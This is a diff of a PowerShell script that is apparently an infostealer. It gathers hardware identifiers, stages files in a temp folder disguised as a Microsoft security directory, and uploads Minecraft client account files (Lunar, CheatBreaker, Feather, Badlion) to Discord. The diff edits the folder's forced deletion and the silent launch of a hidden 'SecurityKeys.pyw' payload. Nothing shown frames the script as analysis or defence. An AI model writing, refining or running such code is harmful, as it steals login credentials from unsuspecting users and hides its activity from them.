@@ -12,7 +12,7 @@ $gpu = (Get-WmiObject win32_VideoController).Name
 $cpu = (Get-WmiObject Win32_Processor).Name
 $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
-rm C:\windows\temp\Win.microsoft.Security.temp
+rm C:\windows\temp\Win.microsoft.Security.temp -r -force
 md C:\windows\temp\Win.microsoft.Security.temp
 cls
 mkdir C:\Windows\Temp\Win.microsoft.Security.temp
@@ -156,7 +156,7 @@ Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.feather\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\Badlion Client\accounts.dat"
-Start-Process -FilePath "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\python.exe" -ArgumentList "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.pyw"
+Start-Process -FilePath "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.pyw"
 #Pythonw.exe is like python.exe but with no windows (like silent start)
 ######################################################################
 
